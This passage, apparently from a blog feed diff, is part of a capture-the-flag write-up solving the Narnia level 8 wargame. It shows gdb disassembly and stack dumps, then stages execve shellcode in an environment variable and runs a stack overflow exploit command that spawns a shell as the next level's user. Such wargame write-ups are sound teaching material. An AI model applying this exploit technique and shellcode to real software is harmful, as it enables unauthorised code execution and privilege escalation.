+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ gdb -q --args ./narnia8 $(python -c "print '\x41'*20")
+</span><span class='line'>Reading symbols from /games/narnia/narnia8...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) disas func
+</span><span class='line'>Dump of assembler code for function func:
+</span><span class='line'>   0x080483f4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x080483f7 &lt;+3&gt;:     sub    esp,0x38
+</span><span class='line'>   0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR [ebp+0x8]
+</span><span class='line'>   0x080483fd &lt;+9&gt;:     mov    DWORD PTR [ebp-0xc],eax
+</span><span class='line'>   0x08048400 &lt;+12&gt;:    mov    DWORD PTR [esp+0x8],0x14
+</span><span class='line'>   0x08048408 &lt;+20&gt;:    mov    DWORD PTR [esp+0x4],0x0
+</span><span class='line'>   0x08048410 &lt;+28&gt;:    lea    eax,[ebp-0x20]
+</span><span class='line'>   0x08048413 &lt;+31&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048416 &lt;+34&gt;:    call   0x8048330 &lt;memset@plt&gt;
+</span><span class='line'>   0x0804841b &lt;+39&gt;:    mov    DWORD PTR ds:0x80497c0,0x0
+</span><span class='line'>   0x08048425 &lt;+49&gt;:    jmp    0x8048449 &lt;func+85&gt;
+</span><span class='line'>   0x08048427 &lt;+51&gt;:    mov    eax,ds:0x80497c0
+</span><span class='line'>   0x0804842c &lt;+56&gt;:    mov    edx,DWORD PTR ds:0x80497c0
+</span><span class='line'>   0x08048432 &lt;+62&gt;:    add    edx,DWORD PTR [ebp-0xc]
+</span><span class='line'>   0x08048435 &lt;+65&gt;:    movzx  edx,BYTE PTR [edx]
+</span><span class='line'>   0x08048438 &lt;+68&gt;:    mov    BYTE PTR [ebp+eax*1-0x20],dl
+</span><span class='line'>   0x0804843c &lt;+72&gt;:    mov    eax,ds:0x80497c0
+</span><span class='line'>   0x08048441 &lt;+77&gt;:    add    eax,0x1
+</span><span class='line'>   0x08048444 &lt;+80&gt;:    mov    ds:0x80497c0,eax
+</span><span class='line'>   0x08048449 &lt;+85&gt;:    mov    eax,ds:0x80497c0
+</span><span class='line'>   0x0804844e &lt;+90&gt;:    add    eax,DWORD PTR [ebp-0xc]
+</span><span class='line'>   0x08048451 &lt;+93&gt;:    movzx  eax,BYTE PTR [eax]
+</span><span class='line'>   0x08048454 &lt;+96&gt;:    test   al,al
+</span><span class='line'>   0x08048456 &lt;+98&gt;:    jne    0x8048427 &lt;func+51&gt;
+</span><span class='line'>   0x08048458 &lt;+100&gt;:   mov    eax,0x8048580
+</span><span class='line'>   0x0804845d &lt;+105&gt;:   lea    edx,[ebp-0x20]
+</span><span class='line'>   0x08048460 &lt;+108&gt;:   mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>   0x08048464 &lt;+112&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048467 &lt;+115&gt;:   call   0x8048300 &lt;printf@plt&gt;
+</span><span class='line'>   0x0804846c &lt;+120&gt;:   leave
+</span><span class='line'>   0x0804846d &lt;+121&gt;:   ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>(gdb) b *func+115
+</span><span class='line'>Breakpoint 1 at 0x8048467
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /games/narnia/narnia8 AAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x08048467 in func ()
+</span><span class='line'>(gdb) x/50xw $esp
+</span><span class='line'>0xffffd6c0:     0x08048580      0xffffd6d8      0x00000014      0xf7fceff4
+</span><span class='line'>0xffffd6d0:     0x080484b0      0x08049794      0x41414141      0x41414141
+</span><span class='line'>0xffffd6e0:     0x41414141      0x41414141      0x41414141      0xffffd8f1
+</span><span class='line'>0xffffd6f0:     0xffffffff      0xf7e5f116      0xffffd718      0x0804848d
+</span><span class='line'>0xffffd700:     0xffffd8f1      0x00000000      0x080484b9      0xf7fceff4
+</span><span class='line'>0xffffd710:     0x080484b0      0x00000000      0x00000000      0xf7e454b3
+</span><span class='line'>0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
+</span><span class='line'>0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
+</span><span class='line'>0xffffd740:     0x0804820c      0xf7fceff4      0x00000000      0x00000000
+</span><span class='line'>0xffffd750:     0x00000000      0xa1ffc16d      0x96f9657d      0x00000000
+</span><span class='line'>0xffffd760:     0x00000000      0x00000000      0x00000002      0x08048340
+</span><span class='line'>0xffffd770:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
+</span><span class='line'>0xffffd780:     0x00000002      0x08048340
+</span><span class='line'>(gdb) x/s 0xffffd8f1
+</span><span class='line'>0xffffd8f1:      'A' &lt;repeats 20 times&gt;
+</span><span class='line'>(gdb) i f
+</span><span class='line'>Stack level 0, frame at 0xffffd700:
+</span><span class='line'> eip = 0x8048467 in func; saved eip 0x804848d
+</span><span class='line'> called by frame at 0xffffd720
+</span><span class='line'> Arglist at 0xffffd6f8, args:
+</span><span class='line'> Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
+</span><span class='line'> Saved registers:
+</span><span class='line'>  ebp at 0xffffd6f8, eip at 0xffffd6fc
+</span><span class='line'>(gdb) p 0xffffd6fc-0xffffd6d8
+</span><span class='line'>$1 = 36</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Notice that when <code>i=20</code> the LSB of the base address (<code>blah</code>) is overwritten. Overwriting this value with the the same value minus 20, will cause the next byte to be read from <code>blah+1</code> (second char of <code>blah</code>), as <code>-20+21=1</code>, thereby copying <code>blah</code> for the second time onto the stack, but to higher addresses, until finally overwriting the return address with <code>blah[16]-blah[19]</code> (inclusive). Overall, 21 bytes are needed.</p>
+
+<p>Lets make the program segfault and extract the addresses of our shellcode and <code>blah</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ mkdir /tmp/doge8
+</span><span class='line'>narnia8@melinda:/narnia$ cd /tmp/doge8
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ vim same_fucking_shellcode.asm
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ nasm same_fucking_shellcode.asm 
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ export BANECAT=$(cat same_fucking_shellcode)
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ cp /narnia/narnia8 .
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ ulimit -c unlimited
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ ./narnia8 $(python -c "print '\x41'*20 + '\x99'")
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>narnia8@melinda:/tmp/doge8$ gdb -q -c ./core
+</span><span class='line'>[New LWP 28703]
+</span><span class='line'>Core was generated by `...`
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'>#0  0x08048451 in ?? ()
+</span><span class='line'>(gdb) x/10xw $ebp
+</span><span class='line'>0xffffd6f8:     0xffffd718      0x0804848d      0xffffd8e0      0x00000000
+</span><span class='line'>0xffffd708:     0x080484b9      0xf7fceff4      0x080484b0      0x00000000
+</span><span class='line'>0xffffd718:     0x00000000      0xf7e454b3
+</span><span class='line'>(gdb) x/s 0xffffd8e0
+</span><span class='line'>0xffffd8e0:      'A' &lt;repeats 20 times&gt;"\231, "
+</span><span class='line'>(gdb) x/6s $esp+0x800
+</span><span class='line'>0xffffdec0:      "sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+</span><span class='line'>0xffffdefd:      "PWD=/tmp/doge8"
+</span><span class='line'>0xffffdf0c:      "LANG=en_US.UTF-8"
+</span><span class='line'>0xffffdf1d:      "SHLVL=1"
+</span><span class='line'>0xffffdf25:      "HOME=/home/narnia8"
+</span><span class='line'>0xffffdf38:      "BANECAT=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Therefore:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 $(python -c "print '\x41' + '\xd8\xff\xff' + '\x41'*12 + '\x40\xdf\xff\xff' + '\xcc'")
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia9</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we are done!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Microcorruption CTF - Part II]]></title>
